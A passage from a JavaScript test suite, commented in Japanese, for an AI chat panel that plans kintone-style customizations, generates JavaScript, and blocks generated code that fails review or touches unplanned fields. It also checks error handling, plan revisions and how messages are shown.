  assert(m.calls.generate.length === 1 && m.calls.generate[0].ctx.customization.customizationId === 'C2' && m.panel.generated('C2') && !m.panel.generated('C1'), 'ボタンから C2 だけを生成（会話の GENERATE_CODE を通る）');
  // 2026-10-06: ボタンからの依頼は、会話には要件の文で出す（送る文と判定は元のまま。C2 の番号は出さない）
  const uGen = m.msgs().filter(x => x.type === 'USER').pop();
  assert(/C2/.test(uGen.text) && uGen.data?.displayText === '「承認済みなら担当者も編集できなくする」のコードを作って' && /「承認済みなら担当者も編集できなくする」のコードを作って/.test(m.chat()) && !/C1|C2/.test(textOf(m.chat())), '選択肢から作る: 会話の発言は「「要件」のコードを作って」と表示（内部の番号 C1 / C2 は会話に出さない）');
  const c2 = m.panel.generated('C2');
  assert(c2.review.status === 'BLOCKED' && c2.review.registration.verdict === 'BLOCKED' && c2.review.checks.some(x => x.name === 'planned-fields' && !x.ok && /owner/.test(x.message)) && c2.review.checks.some(x => x.name === 'target-fields' && !x.ok && /amount/.test(x.message)) && c2.review.mismatches.some(x => x.code === 'MISSING_FIELD' && x.items.includes('owner')), 'C2 なのに amount を制御する patch: owner の処理が無い・amount は計画外 → 登録不可（Phase 21。以前は確認が必要の扱い）');
  assert(/コードの確認：<span[^>]*>× 採用不可/.test(m.chat()) && /登録できるか：× 登録できません/.test(m.chat()) && /要件との不一致・採用できない問題があるため登録できません/.test(m.chat()) && m.$('kt-ai-code-register').style.display === 'none', 'コードカード: × 採用不可・登録できるか：× 登録できません（Phase 21）。登録ボタンは出ない');
  // 計画の修正（カスタマイズの対象をモバイルにも）→ v2。生成結果は v1 に残り v2 には無い
  const rv = await m.panel.send('金額のロックはモバイルでも動くようにして');
  assert(rv.intent === KTAiConversation.INTENT.REVISE_PLAN && m.calls.plan.length === 2 && m.calls.plan[1].ctx.revision && m.conv().activePlan().version === 2, 'カスタマイズの修正 → REVISE_PLAN → v2');
  const v2 = m.conv().activePlan();
  assert(v2.plan.customizations[0].platform.join() === 'desktop,mobile' && v2.review.steps.find(r => r.solution === 'CUSTOMIZATION')?.codeGeneration?.supported === true && !m.panel.generated('C1', v2) && !m.panel.generated('C2', v2), 'v2: platform desktop / mobile。v1 の生成コードは v2 に引き継がない（再生成が必要）');
  // 2026-10-06: 同じ計画の新しい版になったら、前の版のコードは右の「コード」に残さない（古いコードを最新として見せない・登録しない）
  assert(/変更案が新しくなったため、前の変更案のコードは表示していません。/.test(m.$('kt-ai-code-head').innerHTML) && m.$('kt-ai-code-view').style.display === 'none' && m.$('kt-ai-diff-view').style.display === 'none' && m.$('kt-ai-code-register').style.display === 'none', 'v2: 右の「コード」から v1 のコードを消し、その旨を出す（登録ボタンも出さない）');
  assert(m.calls.plan[1].ctx.revision.previousPlan && JSON.stringify(m.calls.plan[1].ctx.revision.previousPlan).includes('C1'), 'revision の previousPlan に customization（C1）が含まれる');
}
{
  // 生成不可（PC / モバイル未定）
  const m = mount({ planResponse: planOf({ steps: [STD_STEP(), JS_STEP()], customizations: [cust({ platform: [] })], solution: 'HYBRID' }) });
  await ticks();
  await m.panel.send(GOAL_HYBRID);
  await confirmSpec(m);
  assert(/要確認/.test(m.$('kt-ai-spec').innerHTML) && /コード生成はまだできません/.test(m.$('kt-ai-review-result').innerHTML) && /PC \/ モバイルのどちらが対象か決まっていません/.test(m.$('kt-ai-review-result').innerHTML), 'PC / モバイル未定: 右の「変更内容」の仕様は「要確認」・右の「確認結果」に確認事項');
  // 2026-10-06: Toolkit の確認のカードは会話に出さない。JS のコード生成の可否は右の「確認結果」で標準設定とは別に数え、会話の実装の内容のカードに作れない旨を出す
  assert(/実行可能な標準設定: 1 件　コード生成可能: 0 件/.test(m.$('kt-ai-review-result').innerHTML) && !/kt-ai-review-card/.test(m.chat()) && /・承認後（完了）は金額を編集できなくする（fieldOnOff\.js を変更・PC かモバイルかは未定）/.test(m.chat()) && /この内容は Toolkit ではコードを生成できません（理由は右の「確認結果」）/.test(m.chat()), 'JS のコード生成の可否: 右の「確認結果」で標準設定 1 件とは別に「コード生成可能: 0 件」。会話の実装の内容のカードに PC かモバイルかは未定・コードを作れない旨');
  assert(/Toolkit の確認：JavaScript カスタマイズに確認が必要な点があります/.test(m.chat()) && !/問題は見つかりませんでした/.test(m.chat()), 'Toolkit の確認の案内（変更案のカード）: JS の要確認を文言に反映（「問題は見つかりませんでした」にしない。実機で確認）');
  const g = await m.panel.send('コードを作って');
  assert(g.ok === false && m.calls.generate.length === 0 && m.msgs().some(x => x.data?.kind === 'generate-blocked') && /まだコードを作れません/.test(m.chat()) && !/\bC1\b/.test(m.chat().replace(/<details[\s\S]*?<\/details>/g, '').replace(/data-[a-z-]+="[^"]*"/g, '')), '生成不可の step は Generator を呼ばない（変更案の修正か確認したいことへの回答を促す。カスタマイズの番号は出さない）');
}
{
  // BLOCKED なコード（未知フィールド）→ 採用不可
  const m = mount({ inputs: INPUTS_PLAIN, planResponse: PLAN_NEW_JS, generatedFor: () => genNew(NEW_JS_GOOD.replace("record['amount'].value", "record['amount_total'].value")) });
  await ticks();
  await m.panel.send('金額が100万円以上なら警告メッセージを表示したい');
  assert(/・金額が100万円以上なら警告メッセージを表示する（新しい JavaScript・PC）/.test(m.chat()) && /標準設定では足りないため、JavaScript カスタマイズを使う計画です/.test(m.chat()) && /変わる内容：JavaScript 1 件</.test(m.chat()) && /＋ 新規 JS/.test(m.$('kt-ai-review-result').innerHTML) && m.conv().activePlan().plan.solution === 'CUSTOMIZATION', '新規 JS の計画: 会話は「新しい JavaScript」・JavaScript カスタマイズを使う計画（設定の変更は無い）。右の「確認結果」に ＋ 新規 JS・solution CUSTOMIZATION');
  await confirmSpec(m);
  const g = await m.panel.send('JS を書いて');
  assert(g.ok && m.calls.generate.length === 1 && m.panel.generated('C1').review.status === 'BLOCKED', 'Generator の応答に未知フィールド → Toolkit Code Review BLOCKED');
  assert(/× 採用不可/.test(m.chat()) && /採用できない問題/.test(m.chat()) && /GENERATED_JS_UNKNOWN_FIELD/.test(m.$('kt-ai-code-review').innerHTML) && /変更案を直して、もう一度作ってください。/.test(m.chat()) && m.$('kt-ai-code-register').style.display === 'none', 'コードカード: × 採用不可・作り直しの案内（変更案を直して、もう一度作る）。理由（GENERATED_JS_UNKNOWN_FIELD）は右の「コード」。登録ボタンは出ない');
  await clickChat(m, 'copy-code', { cid: 'C1' });
  assert(m.copies.length === 1, 'BLOCKED でもコードの確認（コピー）はできる（登録はしない）');
}

// =========================================================
console.log('\n--- §53-3. JS_SOURCE_UNAVAILABLE → 再スキャン / 契約に無い / Gateway エラー / キャンセル ---');
{
  let available = false;
  const m = mount({ inputs: INPUTS_CACHED, loadJsSource: async ({ name, fileKey }) => (available && name === 'fieldOnOff.js' && fileKey === '20261003000000EEEE' ? FIELD_ON_OFF : null), rescanJs: async () => { available = true; return { ok: true, fromCache: false }; } });
  await ticks();
  await m.panel.send(GOAL_HYBRID);
  const v = m.conv().activePlan();
  assert(v.review.steps.find(r => r.solution === 'CUSTOMIZATION').codeGeneration.sourceAvailable === false && v.review.steps.find(r => r.solution === 'CUSTOMIZATION').codeGeneration.supported === true, 'キャッシュ payload: 本文なし（生成は試みる）');
  await confirmSpec(m);
  const g = await m.panel.send('コードを作って');
  // 2026-10-06: 会話は利用者の言葉だけ（JS_SOURCE_UNAVAILABLE の文字は出さない。種類 source-unavailable と統合先のファイルは記録に残る）
  assert(g.ok === false && m.calls.generate.length === 0 && m.msgs().some(x => x.data?.kind === 'source-unavailable' && x.data.file?.name === 'fieldOnOff.js') && /統合先「fieldOnOff\.js」の本文を取得できませんでした。既存のファイルへの自動生成は行いません。/.test(m.chat()) && !/JS_SOURCE_UNAVAILABLE/.test(m.chat()), '本文を取得できない: Generator を呼ばず、統合先の本文を取得できない旨（既存ファイルへの自動生成はしない。内部の名前 JS_SOURCE_UNAVAILABLE は会話に出さない）');
  assert(/data-act="rescan"[^>]*>再スキャン（JavaScript を取り直す）</.test(m.chat()) && /data-act="choice" data-intent="REVISE_PLAN"[^>]*data-display="既存のファイルに入れずに、新しい JavaScript ファイルとして作って"[^>]*>新しい JavaScript として作る</.test(m.chat()) && /手動で確認する/.test(m.chat()), '選択肢: 再スキャン / 新しい JavaScript として作る（計画の修正）/ 手動確認');
  await clickChat(m, 'rescan', { cid: 'C1' });
  await ticks(4);
  assert(available === true && m.calls.generate.length === 1 && m.calls.generate[0].ctx.existingFile?.source === FIELD_ON_OFF && m.panel.generated('C1')?.review.status === 'OK', '再スキャン → 本文を取得 → 同じカスタマイズのコードを生成（OK）');
  const m2 = mount({ inputs: INPUTS_CACHED, loadJsSource: async () => null });
  await ticks();
  await m2.panel.send(GOAL_HYBRID);
  await confirmSpec(m2);
  await m2.panel.send('コードを作って');
  await clickChat(m2, 'choice', { intent: 'REVISE_PLAN', text: 'C1 は既存ファイルに統合せず、新規の JS ファイルとして設計して', display: '既存のファイルに入れずに、新しい JavaScript ファイルとして作って' });
  assert(m2.calls.plan.length === 2 && m2.calls.plan[1].ctx.revision?.request.includes('新規の JS ファイルとして設計'), '「新しい JavaScript として作る」→ 計画の修正（REVISE_PLAN）として Planner へ（送る文は元のまま）');
  assert(/<div class="kt-ai-msg role-user"[^>]*><div class="kt-ai-bubble">既存のファイルに入れずに、新しい JavaScript ファイルとして作って<\/div>/.test(m2.chat()) && !/C1 は既存ファイルに統合せず/.test(textOf(m2.chat())), '会話の発言はボタンの表示の文（data-display）。内部の番号 C1 を含む送る文は出さない');
}
{
  const m = mount({ health: HEALTH_NO_GEN });
  await ticks();
  await m.panel.send(GOAL_HYBRID);
  await confirmSpec(m);
  const g = await m.panel.send('コードを作って');
  assert(g.ok === false && m.calls.generate.length === 0 && m.msgs().some(x => x.type === 'ERROR' && x.data.code === 'GENERATOR_NOT_AVAILABLE') && /JavaScript の生成」を利用できません/.test(m.chat()), '契約に customization-generator が無い: GENERATOR_NOT_AVAILABLE（Planner / Q&A は使える）');
  // 2026-10-06: エラーの番号は本文に出さず、［詳細情報］の中だけ（[CODE] の形では出さない）
  assert(/<details class="kt-ai-tech"><summary>詳細情報<\/summary><div class="kt-ai-error-code">GENERATOR_NOT_AVAILABLE/.test(m.chat()) && !/\[GENERATOR_NOT_AVAILABLE\]/.test(m.chat()), 'エラーカード: GENERATOR_NOT_AVAILABLE は［詳細情報］の中だけ');
  assert(m.panel.capability().features['customization-generator']?.available === false && m.panel.capability().features['change-planner']?.available === true, 'capability: generator だけ利用不可');
}
{
  const m = mount({ generateError: new KTAiClient.AiClientError({ code: KTAiClient.ERROR_CODES.RATE_LIMITED, message: 'rate', retryAfterSeconds: 30, requestId: 'gen-x' }) });
  await ticks();
  await m.panel.send(GOAL_HYBRID);
  await confirmSpec(m);
  const g = await m.panel.send('コードを作って');
  assert(g.ok === false && m.calls.generate.length === 1 && m.msgs().some(x => x.type === 'ERROR' && x.data.code === 'RATE_LIMITED' && x.data.retryText === 'コードを作って') && !m.panel.generated('C1'), 'Gateway の RATE_LIMITED: エラーカード（再試行）。生成結果は無い');
  assert(/data-act="retry"/.test(m.chat()) && /data-intent="GENERATE_CODE"/.test(m.chat()), '再試行ボタンは GENERATE_CODE を保持');
  assert(/<div class="kt-ai-error-code">RATE_LIMITED[^<]*<\/div><\/details>/.test(m.chat()) && !/\[RATE_LIMITED\]/.test(m.chat()), 'エラーカード: RATE_LIMITED は［詳細情報］の中だけ');
  assert(writes(m).length === 0, 'エラー時も書き込み 0 件');
}
{
  const m = mount({ planResponse: PLAN_STD });
  await ticks();
  await m.panel.send('承認済みの一覧を追加したい');
  const g = await m.panel.send('コードを作って');
  assert(g.intent === KTAiConversation.INTENT.GENERAL && m.calls.generate.length === 0, '標準設定だけの計画で「コードを作って」: カスタマイズが無い（GENERAL）');
  assert(!/JavaScript カスタマイズ/.test(KTAiChatUi.planCardHtml(m.conv().activePlan())) && /JavaScript カスタマイズはありません/.test(m.chat()) && !/kt-ai-review-hybrid/.test(m.$('kt-ai-review-result').innerHTML), '標準のみの計画カード / Review は従来どおり（JS の段なし）。「コードを作って」には「カスタマイズはありません」と答える');
}

// =========================================================
console.log('\n--- §53-4. KTAiChatUi（純関数）---');
{
  const hy = reviewPlan(PLAN_HYBRID);
  const v = { planId: 'p', version: 1, status: 'ACTIVE', goal: GOAL_HYBRID, plan: hy.plan, review: hy.review, generated: {} };
  // Phase 19: カスタマイズの詳細は実装仕様カード（右の「変更内容」）に一本化。会話の仕様カードは要約
  const vSpec = { ...v, spec: { specId: 'p:spec', version: 1, status: 'DRAFT', customizations: hy.plan.customizations } };
  const card = KTAiChatUi.specCardHtml(vSpec);
  assert(/生成可/.test(card) && /✎ fieldOnOff\.js を変更/.test(card) && /data-act="confirm-spec"/.test(card), 'specCardHtml（右）: 生成可バッジ・統合先・［この仕様で確定］');
  const chatSpec = KTAiChatUi.specChatCardHtml(vSpec);
  assert(/JavaScript の実装の内容をまとめました。/.test(chatSpec) && /・承認後（完了）は金額を編集できなくする（fieldOnOff\.js を変更・PC）/.test(chatSpec) && !/C1|v1/.test(textOf(chatSpec)) && !/confirm-spec/.test(chatSpec) && /data-act="open-spec"[^>]*>内容を見る</.test(chatSpec), 'specChatCardHtml（会話）: 要件と統合先・PC / モバイルの要約と［内容を見る］だけ（C1・版の番号は出さない）');
  const cardNew = KTAiChatUi.specCardHtml({ planId: 'p', version: 1, status: 'ACTIVE', plan: PLAN_NEW_JS.plan, review: null, spec: { specId: 'p:spec', version: 1, status: 'DRAFT', customizations: [NEW_JS_CUST()] } });
  assert(/＋ 新規 JS/.test(cardNew) && /app\.record\.create\.change\.amount/.test(cardNew), 'specCardHtml（新規 JS）');
  const m = { id: 'x', role: 'toolkit', type: 'CODE', text: 'JavaScript', data: { planId: 'p', version: 1, customizationId: 'C1' } };
  const noGen = KTAiChatUi.messageHtml(m, { plans: new Map([['p:1', v]]) });
  assert(/JavaScript/.test(noGen) && !/Toolkit Code Review/.test(noGen), '生成結果が無い CODE メッセージは文章だけ');
  const rv = KTCodeReview.review({ generated: genPatch(), customization: hy.plan.customizations[0], plan: hy.plan, data: INPUTS.data, scan: INPUTS.scan, existingSource: SRC });
  v.generated.C1 = { generated: genPatch(), review: rv, existingSource: SRC };
  const withGen = KTAiChatUi.messageHtml(m, { plans: new Map([['p:1', v]]) });
  assert(/kt-ai-code-card/.test(withGen) && /JavaScript を作りました。/.test(withGen) && /コードの確認：/.test(withGen) && /✓ 検査を通過/.test(withGen) && !/✓ 既存ファイルへの統合/.test(withGen) && /✓ 既存ファイルへの統合/.test(KTAiChatUi.codePaneHtml(v.generated.C1).review) && /✓ 構文/.test(KTAiChatUi.codePaneHtml(v.generated.C1).review), 'codeCardHtml は要約（コードの確認：✓ 検査を通過）。Toolkit Code Review の ✓ 一覧は codePaneHtml（右の「コード」。検査名は日本語）');
  const pane = KTAiChatUi.codePaneHtml(v.generated.C1, { view: 'diff' });
  assert(pane.code === rv.finalCode && /^\+/m.test(pane.diff) && /fieldOnOff\.js/.test(pane.head), 'codePaneHtml: code / diff / head');
  assert(KTAiChatUi.STRATEGY_JA.EXTEND_EXISTING_JS === '✎ 既存 JS を変更' && KTAiChatUi.STRATEGY_JA.NEW_JS_FILE === '＋ 新規 JS', 'STRATEGY_JA');
}

console.log(`\n${state.failed ? 'FAILED' : 'ALL PASSED'}: ${state.passed} passed / ${state.failed} failed`);
process.exit(state.failed ? 1 : 0);
})().catch(e => { console.error(e); process.exit(1); });
